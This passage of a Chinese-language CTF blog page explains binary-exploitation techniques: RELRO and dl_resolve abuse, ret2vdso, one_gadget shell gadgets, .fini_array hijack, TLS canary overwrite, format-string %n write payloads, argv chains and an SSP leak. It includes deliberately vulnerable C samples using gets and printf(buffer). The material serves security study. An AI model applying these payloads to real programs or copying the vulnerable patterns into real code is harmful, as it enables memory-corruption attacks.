+<h3 id="利用-64-bits-NO-RELRO"><a href="#利用-64-bits-NO-RELRO" class="headerlink" title="利用 64 bits NO RELRO"></a>利用 64 bits NO RELRO</h3><p>No RELRO - .dynamic 跟 GOT 都可以寫<br>Partial RELRO - .dynamic不可寫，GOT可以寫<br>Full RELRO - .dynamic 跟 GOT 都不可寫，函式的地址在程式開始執行之前就會都先填好</p>
+<p>開始講，怎麼樣利用dl_runtime_resolve這個機制<br>首先我們說到他會call <code>dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL)</code></p>
+<p>而會修復成甚麼東西跟第一個參數 strtab + sym-&gt;st_name 有很大的關係</p>
+<p>l_info[DT_STRTAB] -&gt; .dynamic DT_STRTAB pointer<br>如果我偽造一張string table在其他地方，並且我們去修改<br>DT_STRTAB pointer指向位置成我們的假table，就可以在讓我們實際修出來的是system或execve之類的(NO RELRO .dynamic可寫，所以可以動)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc chal.c -o chal -fno-stack-protector -no-pie -z noexecstack -z norelro</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;pop %rdi ; ret&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;pop %rsi ; ret&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;pop %rdx ; ret&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2vdso"><a href="#ret2vdso" class="headerlink" title="ret2vdso"></a>ret2vdso</h2><p>virtual dynamic shared object<br>早期 32 bits的時候 OS 會透過 interrupt的方式在usermode去處發syscall<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Call_gate_(Intel)">https://en.wikipedia.org/wiki/Call_gate_(Intel)</a></p>
+<p>中斷號 0x80 就是syscall<br>也就是<code>int 0x80</code></p>
+<p>但是用 int 0x80 速度有點慢，所以出現了快速syscall</p>
+<p>32 位元的處理器 (即 IA32): sysenter 和 sysexit<br>64 位元的處理器 (即 x86_64): syscall 和 sysret</p>
+<p>然而在兼容性上出了問題，所以出現了vsyscall，具體怎麼syscall由kernel決定，vsyscall實現在vdso中實現</p>
+<h3 id="memory-segment"><a href="#memory-segment" class="headerlink" title="memory segment"></a>memory segment</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">naup@naup-virtual-machine:~/Desktop/NHNC-CTF-challege/slime_revenge_revenge/solver$ cat /proc/self/maps | grep vdso</span><br><span class="line">7ffcf2bcf000-7ffcf2bd1000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">naup@naup-virtual-machine:~/Desktop/NHNC-CTF-challege/slime_revenge_revenge/solver$ cat /proc/self/maps | grep vsyscall</span><br><span class="line">ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>
+
+<h3 id="vdso-ASLR"><a href="#vdso-ASLR" class="headerlink" title="vdso ASLR"></a>vdso ASLR</h3><p>先看x86的vdso ASLR，基本上沒有很多種可能</p>
+<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5236?time__1311=n4+xnieWw4yDRDRxQqGNDQa4C3xBll7B1rAoD">https://xz.aliyun.com/t/5236?time__1311=n4%2BxnieWw4yDRDRxQqGNDQa4C3xBll7B1rAoD</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Rong_Toa/article/details/115299552">https://blog.csdn.net/Rong_Toa/article/details/115299552</a></p>
+<h2 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One gadget"></a>One gadget</h2><ul>
+<li><p>下載</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget libc-2.23.so</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>libc中有些one gadget只要滿足條件跳過去就可以get shell(用one gadget看到的地址要加上libc base)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget libc-2.23.so</span><br><span class="line"></span><br><span class="line">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL                              </span><br><span class="line"></span><br><span class="line">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
+<h3 id="demo-3"><a href="#demo-3" class="headerlink" title="demo"></a>demo</h3><p><a target="_blank" rel="noopener" href="https://hackmd.io/@naup96321/HkWFe5-SC">https://hackmd.io/@naup96321/HkWFe5-SC</a></p>
+<h2 id="init-array-fini-array-hijack"><a href="#init-array-fini-array-hijack" class="headerlink" title=".init_array &amp; .fini_array hijack"></a>.init_array &amp; .fini_array hijack</h2><p><img src="https://hackmd.io/_uploads/SJZYg6E50.png" alt="image"></p>
+<p><a target="_blank" rel="noopener" href="https://nocbtm.github.io/2020/02/20/%C2%96-fini-array%E6%AE%B5%E5%8A%AB%E6%8C%81/#%E5%89%8D%E8%A8%80">https://nocbtm.github.io/2020/02/20/%C2%96-fini-array%E6%AE%B5%E5%8A%AB%E6%8C%81/#%E5%89%8D%E8%A8%80</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/SmalOSnail/article/details/106005946">https://blog.csdn.net/SmalOSnail/article/details/106005946</a></p>
+<h2 id="TLS-bypass-canary"><a href="#TLS-bypass-canary" class="headerlink" title="TLS bypass canary"></a>TLS bypass canary</h2><h3 id="TLS-Thread-Local-Storage"><a href="#TLS-Thread-Local-Storage" class="headerlink" title="TLS(Thread Local Storage)"></a>TLS(Thread Local Storage)</h3><p>TLS 是個讓每個執行緒都可以有一份自己的資料的機制</p>
+<p>每個線程可以獨立的修改自己的副本，而不會影響到其他的線程，造成race condition等問題</p>
+<p>就好像一個圖書館有很多書(全局變量)，學生(線程)可以去拿書，但可能會造成資源衝突，所以做法是複製圖書館的書，存到自己的櫥櫃(TLS)，這樣就可以避免衝突了</p>
+<h3 id="TLS誤區"><a href="#TLS誤區" class="headerlink" title="TLS誤區"></a>TLS誤區</h3><p>然而若global variable本意是要讓線程間共享，那TLS就不適用了，仍然需要mutex等做同步</p>
+<h3 id="TLS用途"><a href="#TLS用途" class="headerlink" title="TLS用途"></a>TLS用途</h3><ul>
+<li><p>執行緒內共享變量：在一個執行緒內的不同方法之間共享變量，而不需要通過參數傳遞。TLS允許每個執行緒持有自己的變量副本，這樣可以在方法之間直接訪問這些變量。</p>
+</li>
+<li><p>每個執行緒獨立實例：在某些情況下，每個執行緒可能需要一個獨立的實例來存儲特定的數據。例如，資料庫連接對象、用戶會話信息等。使用TLS可以確保每個執行緒擁有自己的實例，從而避免執行緒之間的衝突。</p>
+</li>
+<li><p>累加操作優化：對於一些全域變量的累加操作，傳統上會使用互斥鎖（mutex）來避免race condition。但使用TLS，可以在每個執行緒中局部累加，然後在某個時機將結果匯總到全域變量。這種做法可以減少鎖的使用，提高程式的並發性能。</p>
+</li>
+<li><p>執行緒安全的全域變量：當需要使用全域變量但又希望執行緒安全時，TLS可以幫助實現這一點。每個執行緒使用自己的本地副本來存儲數據，而不直接訪問全域變量，從而避免race condition。</p>
+</li>
+</ul>
+<h3 id="TLS-canary"><a href="#TLS-canary" class="headerlink" title="TLS &amp; canary"></a>TLS &amp; canary</h3><p>首先canary常被儲存在TLS中</p>
+<p>多線程中的canary在每個線程都是被獨立存在TLS中，並由TCB管理，並在線程運行中拿出插到stack上(獨立的canary值)</p>
+<p>然而TLS在stack高位，通過overflow可以覆蓋到TLS上的canary<br>條件是:</p>
+<ul>
+<li>創建一個線程，並在線程中overflow</li>
+<li>通常需求overflow的長度高達一個page</li>
+</ul>
+<p>條件很嚴苛，但某些失誤導致使用者可以修改到stack_guard段的內容</p>
+<h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>攻擊前須要先了解兩個struct</p>
+<p>struct pthread</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span> <span class="comment">// 为了使用 size_t</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Definition of the tcbhead_t structure (hypothetical) */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="comment">// 定义线程控制块头部结构体</span></span><br><span class="line">    <span class="comment">// 可以根据实际情况进行定义</span></span><br><span class="line">    <span class="comment">// 例如：线程ID、状态信息等</span></span><br><span class="line">    <span class="type">int</span> thread_id;</span><br><span class="line">    <span class="comment">// 其他相关信息</span></span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br><span class="line">​</span><br><span class="line"><span class="comment">/* Define the pthread structure */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pthread</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !TLS_DTV_AT_TP</span></span><br><span class="line">    <span class="comment">/* This overlaps the TCB as used for TLS without threads (see tls.h).  */</span></span><br><span class="line">    <span class="type">tcbhead_t</span> header; <span class="comment">// 可能与TLS相关的头部信息</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">// 更复杂的结构体定义</span></span><br><span class="line">        <span class="comment">// 可能包含与TLS相关的更多详细信息</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125; header;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* Extra padding for alignment and potential future use */</span></span><br><span class="line">    <span class="type">void</span> *__padding[<span class="number">24</span>]; <span class="comment">// 填充数组，用于对齐和可能的未来扩展</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>tcbhead_t</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *tcb;            <span class="comment">/* 指向线程控制块（TCB）的指针 */</span></span><br><span class="line">    <span class="type">dtv_t</span> *dtv;           <span class="comment">/* 线程特定数据的指针 */</span></span><br><span class="line">    <span class="type">void</span> *self;           <span class="comment">/* 指向线程描述符的指针 */</span></span><br><span class="line">    <span class="type">int</span> multiple_threads; <span class="comment">/* 标识是否有多个线程 */</span></span><br><span class="line">    <span class="type">int</span> gscope_flag;      <span class="comment">/* 全局作用域标志 */</span></span><br><span class="line">    <span class="type">uintptr_t</span> sysinfo;    <span class="comment">/* 系统信息 */</span></span><br><span class="line">    <span class="type">uintptr_t</span> stack_guard;<span class="comment">/* 堆栈保护 */</span></span><br><span class="line">    <span class="type">uintptr_t</span> pointer_guard; <span class="comment">/* 指针保护 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 其他可能的字段... */</span></span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>stack_guard那塊存放的就是canary的值</p>
+<h3 id="TLScanary攻擊流程"><a href="#TLScanary攻擊流程" class="headerlink" title="TLScanary攻擊流程"></a>TLScanary攻擊流程</h3><ul>
+<li>定位到canary存放的位置</li>
+<li>蓋掉canary</li>
+<li>bypass !</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://liupzmin.com/2019/09/30/concurrence/tls-summary/">https://liupzmin.com/2019/09/30/concurrence/tls-summary/</a></p>
+<h3 id="題目-1"><a href="#題目-1" class="headerlink" title="題目"></a>題目</h3><p>DASCTF X CBCTF 2023 binding</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13074?time__1311=GqmhBKqIxGxBMx+oEYqi=5G=8itr4vYx">https://xz.aliyun.com/t/13074?time__1311=GqmhBKqIxGxBMx%2BoEYqi%3D5G%3D8itr4vYx</a></p>
+<h2 id="format-string"><a href="#format-string" class="headerlink" title="format string"></a>format string</h2><h3 id="有哪些format-string"><a href="#有哪些format-string" class="headerlink" title="有哪些format string"></a>有哪些format string</h3><table>
+<thead>
+<tr>
+<th>fmt</th>
+<th>意思</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%d</td>
+<td>讀取十進制數值(存的值當指標去讀)</td>
+</tr>
+<tr>
+<td>%x</td>
+<td>讀取十六進制數值(存的值當指標去讀)</td>
+</tr>
+<tr>
+<td>%s</td>
+<td>讀取字串符數值(存的值當指標去讀)</td>
+</tr>
+<tr>
+<td>%p</td>
+<td>直接讀取</td>
+</tr>
+</tbody></table>
+<h2 id="讀取"><a href="#讀取" class="headerlink" title="讀取"></a>讀取</h2><p>printf參數依序為<br>rdi → rsi → rdx → rcx → r8 → r9 → rsp -&gt; rsp+0x8 -&gt; rsp+0x10</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d%c%s&quot;</span>, a,  b,  c);</span><br><span class="line">          |      |   |   |</span><br><span class="line">         rdi    rsi rdx rcx</span><br></pre></td></tr></table></figure>
+<p>使用 %x$y 直接指定第幾個參數，這邊的 x 是第幾個參數，y 則是要使用的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%2$p          // 印出 rdx (第 2 個參數)</span><br><span class="line">%3$n          // 寫入 rcx (第 3 個參數)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> a=<span class="number">12</span>;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">10</span>;</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="built_in">printf</span>(buffer,a,b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>輸入<code>%p %p %p %p %p %p %p</code></p>
+<p>輸出分別是 rsi → rdx → rcx → r8 → r9 → rsp -&gt; rsp+0x8 -&gt; rsp+0x10</p>
+<h2 id="寫入"><a href="#寫入" class="headerlink" title="寫入"></a>寫入</h2><p><code>printf</code>可以使用%n來寫入指定位置(跟%s很像，只是變成寫入)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsp + 0x10 -&gt; adress -&gt; %n寫入的位置</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>format string</th>
+<th>bytes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%lln</td>
+<td>8 bytes</td>
+</tr>
+<tr>
+<td>%n</td>
+<td>4 bytes</td>
+</tr>
+<tr>
+<td>%hn</td>
+<td>2 bytes</td>
+</tr>
+<tr>
+<td>%hhn</td>
+<td>1 byte</td>
+</tr>
+</tbody></table>
+<h3 id="n"><a href="#n" class="headerlink" title="%n"></a>%n</h3><p>會將printf輸出過的字元數量寫入指定位置</p>
+<h3 id="寫入字元數"><a href="#寫入字元數" class="headerlink" title="寫入字元數"></a>寫入字元數</h3><p>寫入字元數字元數 % 256*(bytes數)</p>
+<p>ex:若printf 20個字元，會寫入20 % 256 &#x3D; 20<br>   若printf 258個字元，會寫入258 % 256 &#x3D; 2</p>
+<h3 id="c"><a href="#c" class="headerlink" title="%c"></a>%c</h3><p>可以透過%c 來指定要寫入的大小</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&lt;寫入幾個字元&gt;c%&lt;位置&gt;$hhn</span><br></pre></td></tr></table></figure>
+
+<p>ex: 寫入0x1234</p>
+<p>第一次: %52c%&lt;位置&gt;$hhn (0x34)</p>
+<p>第二次: %222c%?&lt;位置&gt;$hhn (0x12) -&gt; 52+222&#x3D;274、274-256&#x3D;0x12</p>
+<blockquote>
+<p>(256-上一次寫入的值+這次寫入的值)%256</p>
+</blockquote>
+<h3 id="舉例"><a href="#舉例" class="headerlink" title="舉例"></a>舉例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rsp        -&gt; %65c%8$h </span><br><span class="line">rsp+0x8    -&gt; 000000hn</span><br><span class="line">rsp+0x10   -&gt; 0x601040 -&gt; &quot;A&quot;寫入</span><br><span class="line">rsp+0x18   -&gt; 00000000</span><br></pre></td></tr></table></figure>
+
+<h2 id="argv-chain"><a href="#argv-chain" class="headerlink" title="argv chain"></a>argv chain</h2><p>argv chain 是利用 stack 上的 argv 來達成任意寫入的功能</p>
+<h3 id="舉例-1"><a href="#舉例-1" class="headerlink" title="舉例"></a>舉例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0x72662f656d6f682f</span><br><span class="line">(rsp+0x58)          (rsp+0x128)         (rsp+0x360)  </span><br></pre></td></tr></table></figure>
+
+<p>argv 0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0x72662f656d6f682f</span><br></pre></td></tr></table></figure>
+<p>argv 1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0x72662f656d6f682f</span><br></pre></td></tr></table></figure>
+<p>argv 2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffeb80 --&gt; 0x72662f656d6f682f</span><br></pre></td></tr></table></figure>
+
+<p>我想把最後的0x72662f656d6f682f寫成<code>0xdeadbeef</code>並把東西寫道這上面</p>
+<h3 id="開始構造"><a href="#開始構造" class="headerlink" title="開始構造"></a>開始構造</h3><p>首先我可以透過argv 1改到 0x7fffffffeb80這個位址</p>
+<p>rsi → rdx → rcx → r8 → r9 → rsp -&gt; rsp+0x8 -&gt; rsp+0x10 …</p>
+<p>$rsp + (n-6) \times 0x8$</p>
+<p>rsp+0x128 -&gt; 43</p>
+<p>所以</p>
+<blockquote>
+<p>%48879c%43$hn</p>
+</blockquote>
+<p>會讓最後2 bytes變成<code>beef</code></p>
+<p>argv 0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0x72662f656d6fbeef</span><br></pre></td></tr></table></figure>
+<p>argv 1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0x72662f656d6fbeef</span><br></pre></td></tr></table></figure>
+<p>argv 2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffeb80 --&gt; 0x72662f656d6fbeef</span><br></pre></td></tr></table></figure>
+
+<h2 id="SSP-Stack-Smashing-Protect-leak"><a href="#SSP-Stack-Smashing-Protect-leak" class="headerlink" title="SSP(Stack Smashing Protect) leak"></a>SSP(Stack Smashing Protect) leak</h2><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23.90/source/debug/stack_chk_fail.c">https://elixir.bootlin.com/glibc/glibc-2.23.90/source/debug/stack_chk_fail.c</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__attribute__ ((<span class="keyword">noreturn</span>))</span><br><span class="line">__stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23.90/source/debug/fortify_fail.c#L26">https://elixir.bootlin.com/glibc/glibc-2.23.90/source/debug/fortify_fail.c#L26</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__attribute__ ((<span class="keyword">noreturn</span>)) internal_function</span><br><span class="line">__fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">		    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果觸發了stack smashing detect的話，可以觀察到 .&#x2F;demo來自於argv 0存的指標指向的值，所以如果我可以蓋掉argv0就可以任意讀了<br><img src="https://hackmd.io/_uploads/SJbHVUOjC.png" alt="image"></p>
+<p>暴力送了 b’A’*2000<br>發現變成segement default</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x728e0a65f82d</span> &lt;getenv+<span class="number">173</span>&gt;    cmp    r12w, word ptr [rbx]</span><br><span class="line">  <span class="number">0x728e0a65f831</span> &lt;getenv+<span class="number">177</span>&gt;    jne    getenv+<span class="number">160</span>               </span><br></pre></td></tr></table></figure>
+<p>去看了一下rbx是啥<br>變成了<code>RBX  0x4141414141414141 (&#39;AAAAAAAA&#39;)</code><br>導致pointer指向錯誤<br>確實可以一次任意i</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/images/posts_cover/LinuxKernel-VirtualMemoryManagement/LinuxKernel-VirtualMemoryManagement.webp" data-sizes="auto" alt="Linux Kernel - Virtual Memory Management" class="lazyload">
+        
+        <a href="/2025/01/20/LinuxKernel-VirtualMemoryManagement/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            Linux Kernel - Virtual Memory Management
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/posts_cover/Windows-kernel-exploitation/Windows-kernel-exploitation.webp" data-sizes="auto" alt="Windows Kernel Exploitation - Part 1" class="lazyload">
+      
+      <a href="/2025/01/20/Windows-Kernel-Exploitation-Part1/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          Windows Kernel Exploitation - Part 1
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      Naup堇姬
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        149.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        13:10
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
